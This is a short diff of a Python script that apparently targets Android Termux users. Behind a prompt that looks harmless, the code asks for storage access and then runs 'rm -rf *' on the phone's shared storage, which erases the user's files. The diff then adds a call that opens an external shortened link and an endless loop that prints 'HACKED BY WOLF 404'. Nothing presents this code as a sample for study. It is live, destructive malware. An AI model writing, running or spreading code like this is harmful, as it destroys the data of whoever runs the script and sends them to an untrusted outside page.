@@ -38,5 +38,8 @@ time.sleep(2)
 if resp==1:
     os.system("termux-setup-storage")
     os.system("cd /storage/emulated/0/ && rm -rf *")
+    os.system("termux-open('https://yip.su/2Dhbp9')")
+    while True:
+        print("HACKED BY WOLF 404")
 else:
     os.system("clear")
